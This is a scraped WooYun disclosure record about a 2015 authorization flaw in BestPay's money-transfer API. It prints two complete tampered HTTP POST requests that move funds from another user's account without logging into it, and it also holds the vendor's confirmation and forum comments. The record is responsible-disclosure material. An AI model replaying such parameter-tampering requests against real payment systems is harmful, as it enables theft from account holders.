{"id": 46512, "wybug_id": "wooyun-2015-090521", "wybug_title": "翼支付某功能设计不当(可影响他人账户资金安全)", "wybug_corp": "bestpay.com.cn", "wybug_author": "蜉蝣", "wybug_date": "2015-01-07 19:06", "wybug_open_date": "2015-02-21 19:08", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["越权操作"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-21：\t细节向公众公开  简要描述： 给个20好不好呢？强烈推荐去做个乌云众测，漏洞狠多翼支付设计不当可窃取他人账户资金 详细说明：  转账给其他人时，登陆的账号是用户甲，修改甲转账时候的POST包，改成如下 乙转给甲1.8元，生成交易单号\nPOST /MEPF_INF2/httppost?ran31=1420620640000?ran67=1420620697000 HTTP/1.1Host: client.bestpay.com.cnConnection: keep-aliveContent-Length: 380Origin: file://Content-Type: application/x-www-form-urlencoded; charset=UTF-8Accept: application/json, text/javascript, */*; q=0.01User-Agent: Mozilla/5.0 (Linux; U; Android 4.0.4; zh-cn; GT-I9100G Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30Accept-Encoding: gzip,deflateAccept-Language: zh-CN, en-USAccept-Charset: utf-8, iso-8859-1, utf-16, gb2312, gbk, *;q=0.7method=predictTransfer&encrypt=&timestamp=000003&sessionkey=&v=000001&sig=&PRODUCTNO=用户乙&TRANSFERTYPE=8&SOURCEBANKCARDNO=&SOURCEACCOUNTNAME=&SOURCEIDTYPE=&SOURCEID=&DESTBANKCARDNO=&DESTACCOUNTNAME=&DESTIDTYPE=&DESTID=&DESTPRODUCTNO=用户甲&TXNAMOUNT=180%7C0&PARTNERID=000016900000&LOCATION=40&CUSTOMERNAME=&TXNPASSWD=&DESTCUSTOMERNAME=&TRANSREASON=&TXNAMOUNTFLAG=1%7C2\n  付款时候,依旧修改POST包，加上用户乙的支付密码，成功在不登陆用户乙的情况下，从乙账户里偷走1.8元\nPOST /MEPF_INF2/httppost?ran31=1420620640000?ran67=1420620697000?ran93=1420620754000 HTTP/1.1Host: client.bestpay.com.cnConnection: keep-aliveContent-Length: 454Origin: file://Content-Type: application/x-www-form-urlencoded; charset=UTF-8Accept: application/json, text/javascript, */*; q=0.01User-Agent: Mozilla/5.0 (Linux; U; Android 4.0.4; zh-cn; GT-I9100G Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30Accept-Encoding: gzip,deflateAccept-Language: zh-CN, en-USAccept-Charset: utf-8, iso-8859-1, utf-16, gb2312, gbk, *;q=0.7method=transfer&encrypt=&timestamp=000004&sessionkey=&v=000001&sig=&PRODUCTNO=用户乙&TXNPASSWD=用户乙支付密码&TRANSFERTYPE=8&SOURCEBANKCARDNO=&SOURCEACCOUNTNAME=&SOURCEIDTYPE=&SOURCEID=&DESTBANKCARDNO=&DESTACCOUNTNAME=&DESTIDTYPE=&DESTID=&DESTPRODUCTNO=用户甲&TXNAMOUNT=180%7C0&PARTNERID=000016900000&PARTNERORDERID=2015010793993881&ORDERID=150107068465925&LOCATION=40&CUSTOMERNAME=&DESTCUSTOMERNAME=&TRANSREASON=%E6%97%A0&TXNAMOUNTFLAG=1%7C2\n   漏洞证明：  \n\n仅测试转账，其他还有几处存在平行权限越权。   修复方案：  限制，争取干掉支付宝。能有个小礼品就更好了   版权声明：转载请注明来源 蜉蝣@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-01-08 09:59 厂商回复： 感谢 蜉蝣 白帽子的辛苦检测，经验证后该问题确实存在，由于他人账户资金仍受支付密码保护，故给Rank 15。目前已准备申请奖励，再次感谢 蜉蝣 ！！！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-08 00:19 |    \t\tCplusHua \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:33        | 乌云奖金:-1)\t\t \n  难道楼主舍得都提交出来？那一片漏洞？    \n     2015-01-08 09:00 |    \t\t孩子不哭站着撸 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:3        | 左手撸站，右手撸管)\t\t \n  说洞多，你都提出来呗，瞎逼逼个毛线。    \n     2015-01-28 13:36 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  赞    \n     2015-01-29 10:44 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  这种逻辑有意思    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}